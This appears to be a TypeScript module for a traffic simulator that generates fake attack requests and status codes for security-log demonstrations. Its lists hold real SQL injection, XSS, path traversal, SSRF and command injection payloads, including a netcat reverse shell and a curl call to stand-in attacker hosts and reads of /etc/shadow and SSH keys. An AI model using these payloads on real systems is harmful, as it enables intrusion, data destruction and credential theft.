import { AttackType } from "../types/attacks";
import { randomElement, randomInt } from "./trafficPatterns";

// SQL Injection patterns
export const sqlInjectionPatterns = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT NULL--",
  "1' AND '1'='1",
  "; DROP TABLE users--",
  "' OR 'x'='x",
  "1' ORDER BY 10--",
  "' UNION ALL SELECT NULL,NULL,NULL--",
  "admin' OR '1'='1'/*",
  "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
  "' AND 1=(SELECT COUNT(*) FROM users)--",
];

// XSS patterns
export const xssPatterns = [
  "<script>alert('xss')</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert('XSS')>",
  "javascript:alert(document.cookie)",
  "<iframe src='javascript:alert(1)'>",
  "<body onload=alert('XSS')>",
  "<<SCRIPT>alert('XSS')//<</SCRIPT>",
  "<IMG SRC='javascript:alert(\"XSS\")'>",
  "<SCRIPT>String.fromCharCode(88,83,83)</SCRIPT>",
  "<IMG SRC=javascript:alert('XSS')>",
];

// Path traversal patterns
export const pathTraversalPatterns = [
  "../../etc/passwd",
  "../../../windows/win.ini",
  "....//....//etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "....\\\\....\\\\windows\\\\system32",
  "../../../config/database.yml",
  "../../.ssh/id_rsa",
  "../../../var/log/apache2/access.log",
];

// Command injection patterns
export const commandInjectionPatterns = [
  "; ls -la",
  "| cat /etc/passwd",
  "&& whoami",
  "`id`",
  "$(curl malicious.com)",
  "; nc -e /bin/sh attacker.com 4444",
  "| ping -c 10 attacker.com",
  "&& cat /etc/shadow",
];

// SSRF patterns
export const ssrfPatterns = [
  "http://169.254.169.254/latest/meta-data/",
  "http://localhost:8080/admin",
  "http://127.0.0.1:22",
  "file:///etc/passwd",
  "http://[::]:80/",
  "http://0.0.0.0:3306/",
];

// Generate attack path based on attack type
export function generateAttackPath(attackType: AttackType): string {
  switch (attackType) {
    case "sql_injection":
      const sqlPayload = randomElement(sqlInjectionPatterns);
      return randomElement([
        `/api/products?id=${sqlPayload}`,
        `/api/users?username=${sqlPayload}`,
        `/search?q=${sqlPayload}`,
        `/login?user=${sqlPayload}`,
        `/api/orders?status=${sqlPayload}`,
      ]);
      
    case "xss":
      const xssPayload = encodeURIComponent(randomElement(xssPatterns));
      return randomElement([
        `/search?q=${xssPayload}`,
        `/comment?text=${xssPayload}`,
        `/profile?name=${xssPayload}`,
        `/api/posts?content=${xssPayload}`,
      ]);
      
    case "path_traversal":
      const pathPayload = randomElement(pathTraversalPatterns);
      return randomElement([
        `/download?file=${pathPayload}`,
        `/api/files?path=${pathPayload}`,
        `/read?document=${pathPayload}`,
        `/view?page=${pathPayload}`,
      ]);
      
    case "command_injection":
      const cmdPayload = encodeURIComponent(randomElement(commandInjectionPatterns));
      return randomElement([
        `/ping?host=8.8.8.8${cmdPayload}`,
        `/exec?cmd=ls${cmdPayload}`,
        `/run?command=whoami${cmdPayload}`,
      ]);
      
    case "ssrf":
      const ssrfPayload = encodeURIComponent(randomElement(ssrfPatterns));
      return randomElement([
        `/api/fetch?url=${ssrfPayload}`,
        `/proxy?target=${ssrfPayload}`,
        `/webhook?callback=${ssrfPayload}`,
      ]);
      
    case "brute_force":
      return randomElement([
        "/login",
        "/admin/login",
        "/api/auth/login",
        "/wp-admin",
        "/administrator",
      ]);
      
    case "ddos":
      return randomElement([
        "/",
        "/api/health",
        "/api/products",
        "/search",
        "/api/users",
      ]);
      
    case "bot_traffic":
      return randomElement([
        "/robots.txt",
        "/sitemap.xml",
        "/.well-known/security.txt",
        "/api/products",
        "/api/posts",
        "/feed",
        "/rss",
      ]);
      
    default:
      return "/";
  }
}

// Generate attack status code
export function getAttackStatus(attackType: AttackType): number {
  switch (attackType) {
    case "sql_injection":
    case "xss":
    case "command_injection":
    case "path_traversal":
      return randomElement([400, 403, 500]); // Bad request, Forbidden, or Error
      
    case "ssrf":
      return randomElement([400, 403, 502]);
      
    case "brute_force":
      return randomElement([401, 401, 401, 403]); // Mostly unauthorized
      
    case "ddos":
      return randomElement([429, 503, 504]); // Rate limit, unavailable, timeout
      
    case "bot_traffic":
      return randomElement([200, 404, 429]); // Sometimes successful
      
    default:
      return 400;
  }
}

// Check if we should trigger DDoS burst
let ddosBurstActive = false;
let ddosBurstCount = 0;
let ddosBurstIP = "";

export function shouldTriggerDDoSBurst(): boolean {
  if (ddosBurstActive && ddosBurstCount > 0) {
    ddosBurstCount--;
    return true;
  }
  
  // Start new DDoS burst (50-200 requests from same IP)
  if (Math.random() < 0.001) { // 0.1% chance to start burst
    ddosBurstActive = true;
    ddosBurstCount = randomInt(50, 200);
    ddosBurstIP = `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`;
    return true;
  }
  
  if (ddosBurstCount === 0) {
    ddosBurstActive = false;
  }
  
  return false;
}

export function getDDoSIP(): string {
  return ddosBurstIP;
}

// Brute force tracking
let bruteForceActive = false;
let bruteForceCount = 0;
let bruteForceIP = "";

export function shouldTriggerBruteForce(): boolean {
  if (bruteForceActive && bruteForceCount > 0) {
    bruteForceCount--;
    return true;
  }
  
  // Start new brute force attempt (20-50 login attempts)
  if (Math.random() < 0.005) { // 0.5% chance
    bruteForceActive = true;
    bruteForceCount = randomInt(20, 50);
    bruteForceIP = `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`;
    return true;
  }
  
  if (bruteForceCount === 0) {
    bruteForceActive = false;
  }
  
  return false;
}

export function getBruteForceIP(): string {
  return bruteForceIP;
}

